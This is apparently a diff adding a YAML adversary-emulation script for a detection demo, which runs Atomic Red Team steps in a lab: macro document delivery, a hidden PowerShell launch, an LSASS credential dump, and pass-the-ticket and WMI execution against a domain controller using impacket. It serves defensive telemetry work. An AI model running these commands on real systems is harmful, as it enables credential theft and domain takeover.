@@ -1,0 +1,85 @@
+# Kill chain step definitions for the Causal Reconstruction Engine demo.
+# Steps are executed in order by run.py via Invoke-AtomicRedTeam on ws01
+# (or kali for delivery steps).
+#
+# host: which machine runs the atomic
+#   ws01 - victim workstation
+#   kali - attacker machine (used for delivery and pass-the-ticket)
+#
+# invoke_on: how run.py reaches the target
+#   winrm  - execute via WinRM (Windows hosts)
+#   local  - run directly on kali
+
+kill_chain:
+
+  - step: 1
+    technique: T1566.001
+    name: Phishing - macro-enabled document delivery
+    description: >
+      Deliver a macro-enabled Office document to the ws01 user's Downloads folder
+      via a simulated email attachment drop. The document contains a VBA macro that
+      spawns PowerShell when opened.
+    host: kali
+    invoke_on: local
+    command: >
+      python3 /opt/atomic-red-team/deliver.py
+      --target ws01
+      --user vagrant
+      --password vagrant
+      --file /opt/atomic-red-team/payloads/macro_invoice.docm
+      --dest "C:\\Users\\vagrant\\Downloads\\invoice.docm"
+
+  - step: 2
+    technique: T1059.001
+    name: PowerShell execution via macro
+    description: >
+      Open the delivered document on ws01, triggering the VBA macro.
+      The macro spawns powershell.exe as a child of WINWORD.EXE, producing
+      Sysmon EID 1 (process creation) with parent WINWORD.EXE.
+    host: ws01
+    invoke_on: winrm
+    command: >
+      Invoke-AtomicTest T1059.001 -TestNumbers 1
+      -InputArgs @{command_to_execute='Start-Process powershell.exe -WindowStyle Hidden'}
+
+  - step: 3
+    technique: T1003.001
+    name: LSASS credential dump
+    description: >
+      The spawned PowerShell process accesses the LSASS process memory to
+      extract credential material (Kerberos tickets and NTLM hashes).
+      Produces Sysmon EID 10 (process access) targeting lsass.exe.
+    host: ws01
+    invoke_on: winrm
+    command: >
+      Invoke-AtomicTest T1003.001 -TestNumbers 1
+
+  - step: 4
+    technique: T1550.003
+    name: Pass-the-ticket lateral movement to dc01
+    description: >
+      Use the extracted Kerberos ticket to authenticate to dc01 without
+      the plaintext password. Impacket's ticketer/psexec are run from kali
+      using the dumped ticket material. Produces Windows Security EID 4768/4769.
+    host: kali
+    invoke_on: local
+    command: >
+      python3 /usr/share/doc/python3-impacket/examples/psexec.py
+      -k -no-pass
+      NORTHPOLE/Administrator@dc01.northpole.local
+      "whoami /all"
+
+  - step: 5
+    technique: T1078.002
+    name: Domain admin logon to dc01
+    description: >
+      Establish an interactive session as a domain administrator on dc01,
+      confirming full Domain Controller compromise. Produces Windows Security
+      EID 4624 (logon type 3) and EID 4672 (special privilege assignment).
+    host: kali
+    invoke_on: local
+    command: >
+      python3 /usr/share/doc/python3-impacket/examples/wmiexec.py
+      -k -no-pass
+      NORTHPOLE/Administrator@dc01.northpole.local
+      "net user /domain"
